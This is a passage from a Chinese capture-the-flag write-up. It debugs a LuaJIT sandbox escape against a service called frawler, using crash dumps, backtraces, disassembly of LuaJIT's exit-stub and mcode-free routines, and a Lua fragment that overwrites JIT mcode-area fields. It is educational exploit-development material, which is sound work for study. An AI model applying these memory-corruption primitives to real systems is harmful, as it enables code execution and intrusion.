最后的利用：
    python2 gen_shellcode.py
    python2 request.py
    [DEBUG] Received 0x1c0 bytes:
        '\n'
        'Error response\n'
        '\n'
        '\n'
        'Error response\n'
        'Error code 400.\n'
        "Message: Bad request syntax ('rwctf{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}\\x04\\x00\\x10\\x00\\x00\\x00\\x00\\xb8\\x03\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\xcf\\x90J\\xa8.\\x00\\x00x\\x03\\x00\\x10\\x00\\x00\\x00\\x00\\x87A\\\\]\\xd3\\x1a\\x00\\x00H\\x94\\x00\\x10\\x02\\x00\\x00\\x00\\x01\\x00\\x00\\x00').\n"
        'Error code explanation: 400 = Bad request syntax or unsupported method.\n'
## 一个字节引发的血案
但是到这个时候我就很不爽了。  
为啥我好不容易才调好的luajit逃逸用不了啊，这没道理啊，那我们来分析一下为啥用不了。
第一步，先把代码跑起来，看看dump日志。
    [40698.170] 01045.01203> devmgr: crash_analyzer_listener: analyzing exception type 0x108
    [40698.171] 01105.01119>    CS:                   0 RIP:     0x7a8af11e4b20 EFL:              0x246 CR2:             0x8000
    [40698.171] 01105.01119>  RAX:             0x8000 RBX:                  0 RCX:                  0 RDX:                  0
    [40698.171] 01105.01119>  RSI:                  0 RDI:     0x5746f370eb58 RBP:     0x799649e95ca0 RSP:     0x799649e95c78
    [40698.171] 01105.01119>   R8:                  0  R9:                  0 R10:                  0 R11:              0x206
    [40698.171] 01105.01119>  R12:     0x5746f370eb58 R13:         0x100003b8 R14:     0x5746f370eb58 R15:                0x1
    [40698.171] 01105.01119>  errc:               0x6
    [40698.171] 01105.01119> bottom of user stack:
    [40698.171] 01105.01119> 0x0000799649e95c78: f11e4acc 00007a8a 10000558 00000000 |.J...z..X.......|
    [40698.171] 01105.01119> 0x0000799649e95c88: f370eed0 00005746 00008008 00000000 |..p.FW..........|
    [40698.171] 01105.01119> 0x0000799649e95c98: 10000558 00000000 49e95cf0 00007996 |X........\.I.y..|
    [40698.171] 01105.01119> 0x0000799649e95ca8: f11c7474 00007a8a a1ad8e1c 9b72fb15 |tt...z........r.|
    [40698.171] 01105.01119> 0x0000799649e95cb8: f370eec8 00005746 10000558 00000000 |..p.FW..X.......|
    [40698.172] 01105.01119> 0x0000799649e95cc8: 10000558 00000000 f1190868 00007a8a |X.......h....z..|
    [40698.172] 01105.01119> 0x0000799649e95cd8: 100003b8 00000000 100003b8 00000000 |................|
    [40698.172] 01105.01119> 0x0000799649e95ce8: 10000378 00000000 49e95d30 00007996 |x.......0].I.y..|
    [40698.172] 01105.01119> 0x0000799649e95cf8: f11c5e0d 00007a8a 1000d0b8 00000000 |.^...z..........|
    [40698.172] 01105.01119> 0x0000799649e95d08: 10000558 00000000 00000018 00000000 |X...............|
    [40698.172] 01105.01119> 0x0000799649e95d18: 100003b8 00000000 10000fa8 00000000 |................|
    [40698.172] 01105.01119> 0x0000799649e95d28: 49e95e00 00007996 10000378 00000000 |.^.I.y..x.......|
    [40698.172] 01105.01119> 0x0000799649e95d38: f11ff4f6 00007a8a 10000fa8 00000000 |.....z..........|
    [40698.172] 01105.01119> 0x0000799649e95d48: 49e95e00 00007996 fffffee0 00000000 |.^.I.y..........|
    [40698.172] 01105.01119> 0x0000799649e95d58: 10000378 10000378 49e95e00 00007996 |x...x....^.I.y..|
    [40698.172] 01105.01119> 0x0000799649e95d68: 10000378 00000000 1000d278 00000000 |x.......x.......|
    [40698.172] 01105.01119> arch: x86_64
    [40698.184] 01105.01119> dso: id=333103e7c266dfce base=0x7a8af118e000 name=app:/pkg/bin/frawler
    [40698.184] 01105.01119> dso: id=8f51b7868dd0d5b9aefede5739518f97f2a580e0 base=0x58f25e8e0000 name=libc.so
    [40698.184] 01105.01119> dso: id=89d4eb99573947ac792dd4a5e9e498bd44b4eefe base=0x554a3ca5d000 name=
    [40698.184] 01105.01119> dso: id=fa0cdaa5591d31e3 base=0x2f6fae109000 name=libc++.so.2
    [40698.184] 01105.01119> dso: id=86f83b6141c863ad base=0x2d3787750000 name=libunwind.so.1
    [40698.184] 01105.01119> dso: id=4b87e913774eb02cb107ae0f1385ddfcb877ba2e base=0xe98beb70000 name=libfdio.so
    [40698.184] 01105.01119> dso: id=ecfc9b0e3f0ca03b base=0xaef30a38000 name=libclang_rt.scudo.so
    [40698.184] 01105.01119> dso: id=1b59f762cf98d972 base=0x85aca3d3000 name=libc++abi.so.1
    [40698.184] 01105.01119> {{{reset}}}
    [40698.185] 01105.01119> {{{module:0x21fb5444::elf:1b59f762cf98d972}}}
    [40698.185] 01105.01119> {{{mmap:0x85aca3d3000:0x16000:load:0x21fb5444:r:0}}}
    [40698.185] 01105.01119> {{{mmap:0x85aca3e9000:0x24000:load:0x21fb5444:rx:0x16000}}}
    [40698.185] 01105.01119> {{{mmap:0x85aca40d000:0x5000:load:0x21fb5444:rw:0x3a000}}}
    [40698.185] 01105.01119> {{{module:0x21fb5445: {{{mmap:0xaef30a38000:0x8000:load:0x21fb5445:r:0}}}
    [40698.185] 01105.01119> {{{mmap:0xaef30a40000:0xa000:load:0x21fb5445:rx:0x8000}}}
    [40698.192] 01105.01119> {{{mmap:0xaef30a4a000:0x4000:load:0x21fb5445:rw:0x12000}}}
    [40698.192] 01105.01119> {{{module:0x21fb5446::elf:4b87e913774eb02cb107ae0f1385ddfcb877ba2e}}}
    [40698.192] 01105.01119> {{{mmap:0xe98beb70000:0x22000:load:0x21fb5446:rx:0}}}
    [40698.192] 01105.01119> {{{mmap:0xe98beb93000:0x4000:load:0x21fb5446:rw:0x23000}}}
    [40698.192] 01105.01119> {{{module:0x21fb5447::elf:86f83b6141c863ad}}}
    [40698.192] 01105.01119> {{{mmap:0x2d3787750000:0x6000:load:0x21fb5447:r:0}}}
    [40698.192] 01105.01119> {{{mmap:0x2d3787756000:0x8000:load:0x21fb5447:rx:0x6000}}}
    [40698.192] 01105.01119> {{{mmap:0x2d378775e000:0x3000:load:0x21fb5447:rw:0xe000}}}
    [40698.192] 01105.01119> {{{module:0x21fb5448::elf:fa0cdaa5591d31e3}}}
    [40698.192] 01105.01119> {{{mmap:0x2f6fae109000:0x52000:load:0x21fb5448:r:0}}}
    [40698.192] 01105.01119> {{{mmap:0x2f6fae15b000:0x77000:load:0x21fb5448:rx:0x52000}}}
    [40698.192] 01105.01119> {{{mmap:0x2f6fae1d2000:0x9000:load:0x21fb5448:rw:0xc9000}}}
    [40698.192] 01105.01119> {{{module:0x21fb5449::elf:89d4eb99573947ac792dd4a5e9e498bd44b4eefe}}}
    [40698.192] 01105.01119> {{{mmap:0x554a3ca5d000:0x7000:load:0x21fb5449:r:0}}}
    [40698.192] 01105.01119> {{{mmap:0x554a3ca64000:0x1000:load:0x21fb5449:rx:0x7000}}}
    [40698.192] 01105.01119> {{{module:0x21fb544a::elf:8f51b7868dd0d5b9aefede5739518f97f2a580e0}}}
    [40698.192] 01105.01119> {{{mmap:0x58f25e8e0000:0xcb000:load:0x21fb544a:rx:0}}}
    [40698.192] 01105.01119> {{{mmap:0x58f25e9ac000:0x6000:load:0x21fb544a:rw:0xcc000}}}
    [40698.192] 01105.01119> {{{module:0x21fb544b::elf:333103e7c266dfce}}}
    [40698.192] 01105.01119> {{{mmap:0x7a8af118e000:0x1d000:load:0x21fb544b:r:0}}}
    [40698.192] 01105.01119> {{{mmap:0x7a8af11ab000:0x57000:load:0x21fb544b:rx:0x1d000}}}
    [40698.192] 01105.01119> {{{mmap:0x7a8af1202000:0x4000:load:0x21fb544b:rw:0x74000}}}
    [40698.196] 01105.01119> bt#01: pc 0x7a8af11e4b20 sp 0x799649e95c78 (app:/pkg/bin/frawler,0x56b20)
    [40698.196] 01105.01119> bt#02: pc 0x7a8af11e4acc sp 0x799649e95c80 (app:/pkg/bin/frawler,0x56acc)
    [40698.197] 01105.01119> bt#03: pc 0x7a8af11c7474 sp 0x799649e95cb0 (app:/pkg/bin/frawler,0x39474)
    [40698.198] 01105.01119> bt#04: pc 0x7a8af11c5e0d sp 0x799649e95d00 (app:/pkg/bin/frawler,0x37e0d)
    [40698.198] 01105.01119> bt#05: pc 0x7a8af11ff4f6 sp 0x799649e95d40 (app:/pkg/bin/frawler,0x714f6)
    [40698.205] 01105.01119> bt#06: pc 0x7a8af11b0547 sp 0x799649e95d90 (app:/pkg/bin/frawler,0x22547)
    [40698.209] 01105.01119> bt#07: pc 0x7a8af11b03a5 sp 0x799649e95db0 (app:/pkg/bin/frawler,0x223a5)
    [40698.209] 01105.01119> bt#08: pc 0x7a8af1200af1 sp 0x799649e95e00 (app:/pkg/bin/frawler,0x72af1)
    [40698.210] 01105.01119> bt#09: pc 0x7a8af11b3218 sp 0x799649e95e50 (app:/pkg/bin/frawler,0x25218)
    [40698.210] 01105.01119> bt#10: pc 0x7a8af11f9f49 sp 0x799649e95e90 (app:/pkg/bin/frawler,0x6bf49)
    [40698.211] 01105.01119> bt#11: pc 0x7a8af11fa0c6 sp 0x799649e95ec0 (app:/pkg/bin/frawler,0x6c0c6)
    [40698.211] 01105.01119> bt#12: pc 0x7a8af11fa270 sp 0x799649e95f10 (app:/pkg/bin/frawler,0x6c270)
    [40698.211] 01105.01119> bt#13: pc 0x58f25e8f9c48 sp 0x799649e95f60 (libc.so,0x19c48)
    [40698.215] 01105.01119> bt#14: pc 0 sp 0x799649e96000
    [40698.215] 01105.01119> bt#15: end
    [40698.218] 01105.01119> {{{bt:1:0x7a8af11e4b20}}}
    [40698.222] 01105.01119> {{{bt:2:0x7a8af11e4acc}}}
    [40698.222] 01105.01119> {{{bt:3:0x7a8af11c7474}}}
    [40698.223] 01105.01119> {{{bt:4:0x7a8af11c5e0d}}}
    [40698.223] 01105.01119> {{{bt:5:0x7a8af11ff4f6}}}
    [40698.224] 01105.01119> {{{bt:6:0x7a8af11b0547}}}
    [40698.224] 01105.01119> {{{bt:7:0x7a8af11b03a5}}}
    [40698.224] 01105.01119> {{{bt:8:0x7a8af1200af1}}}
    [40698.226] 01105.01119> {{{bt:9:0x7a8af11b3218}}}
    [40698.226] 01105.01119> {{{bt:10:0x7a8af11f9f49}}}
    [40698.227] 01105.01119> {{{bt:11:0x7a8af11fa0c6}}}
    [40698.227] 01105.01119> {{{bt:12:0x7a8af11fa270}}}
    [40698.228] 01105.01119> {{{bt:13:0x58f25e8f9c48}}}
    [40698.229] 01105.01119> {{{bt:14:0}}}
根据之前我们调exp的时候，知道aslr的情况来看，非常明显我们没能跳到shellcode执行，死在中间了。
幸运的是dump里给出了bt，所以来跟一下，看看是死在哪儿了。  
在这种时候，如果你之前完整跟了上一篇里的luajit代码，并且自己看了一遍，日子就好过多了，毕竟流程上差异不大。
首先是`0x56b20`，直接原因。
    LOAD:0000000000056B1B mov     ecx, esi
    LOAD:0000000000056B1D shl     ecx, 5
    LOAD:0000000000056B20 mov     byte ptr [rax], 6Ah ; 'j'
    LOAD:0000000000056B23 mov     [rax+1], cl
    LOAD:0000000000056B26 mov     r9d, esi
    LOAD:0000000000056B29 and     r9d, 7
rax目前的值为0x8000，显然放不进去，但是仔细一看这个结构：
这不就是上一篇里的`asm_exitstub_gen`么？但是看起来这个死的位置有点奇怪啊，应该是死在了赋值给`mxp`的时候了。  
回顾一下代码：
    /* Generate an exit stub group at the bottom of the reserved MCode memory. */
    static MCode *asm_exitstub_gen(ASMState *as, ExitNo group)
    {
      ExitNo i, groupofs = (group*EXITSTUBS_PER_GROUP) & 0xff;
      MCode *mxp = as->mcbot;
      MCode *mxpstart = mxp;
      if (mxp + (2+2)*EXITSTUBS_PER_GROUP+8+5 >= as->mctop)
        asm_mclimit(as);
      /* Push low byte of exitno for each exit stub. */
      *mxp++ = XI_PUSHi8; *mxp++ = (MCode)groupofs; // 应该是这里死了
      for (i = 1; i >8);
      /* Store DISPATCH at original stack slot 0. Account for the two push ops. */
      *mxp++ = XI_MOVmi;
      *mxp++ = MODRM(XM_OFS8, 0, RID_ESP);
      *mxp++ = MODRM(XM_SCALE1, RID_ESP, RID_ESP);
      *mxp++ = 2*sizeof(void *);
      *(int32_t *)mxp = ptr2addr(J2GG(as->J)->dispatch); mxp += 4;
      /* Jump to exit handler which fills in the ExitState. */
      *mxp++ = XI_JMP; mxp += 4;
      *((int32_t *)(mxp-4)) = jmprel(mxp, (MCode *)(void *)lj_vm_exit_handler);
      /* Commit the code for this group (even if assembly fails later on). */
      lj_mcode_commitbot(as->J, mxp);
      as->mcbot = mxp;
      as->mclim = as->mcbot + MCLIM_REDZONE;
      return mxpstart;
    }
再对比一下寄存器值，这里mxp其实是`mcbot`，但是这里的值是0x8000，0x8000按理说是我设置的`mctab[3]`，也就是`szmcarea`的值吧？
回顾一下结构：
    mcprot = 0x0, 
      mcarea = 0x1234 , 
      mctop = 0x4321 , 
      mcbot = 0xdead , 
      szmcarea = 0xbeef, 
      szallmcarea = 0x1000,
那么这里岂不是，错了个位？回想一下最开始的exp，好像这里就是错了个位啊.
为了保证我们的判断没有错，我们再魔改一下看看。
    local mcarea = mctab[1]
        mctab[0] = 0x1234/ 2^52 / 2^1022
        mctab[1] = 0x4321/ 2^52 / 2^1022
        mctab[2] = 0xdead / 2^52 / 2^1022
        mctab[3] = asaddr / 2^52 / 2^1022
        mctab[4] = 2^12 / 2^52 / 2^1022
        --while mctab[0] == 0 do end
        local i = 1
        while i < 0x1000000 do 
            i = i + 1 
            --print(i)
        end
崩溃位置在`0x2bd70`，此时`rdi`为`0x4321。
和源码对比之后是可以确认这个函数的：
    __int64 __fastcall lj_mcode_free(__int64 a1)
    {
      __int64 result; // rax
      _QWORD *v2; // rdi
      _QWORD *v3; // rbx
      result = a1;
      v2 = *(_QWORD **)(a1 + 2448);
      *(_QWORD *)(result + 2448) = 0LL;
      *(_QWORD *)(result + 2480) = 0LL;
      if ( v2 )
      {
        do
        {
          v3 = (_QWORD *)*v2;
          result = mcode_free(v2, v2[1]);
          v2 = v3;
        }
        while ( v3 );
      }
      return result;
    }
崩溃位置：
    LOAD:000000000002BD70
    LOAD:000000000002BD70 loc_2BD70:
    LOAD:000000000002BD70 mov     rbx, [rdi] <-- 崩溃，rdi = 0x4321
    LOAD:000000000002BD73 mov     rsi, [rdi+8]
    LOAD:000000000002BD77 call    mcode_free
    LOAD:000000000002BD7C mov     rdi, rbx
    LOAD:000000000002BD7F test    rbx, rbx
    LOAD:000000000002BD82 jnz     short loc_2BD70
对比原函数：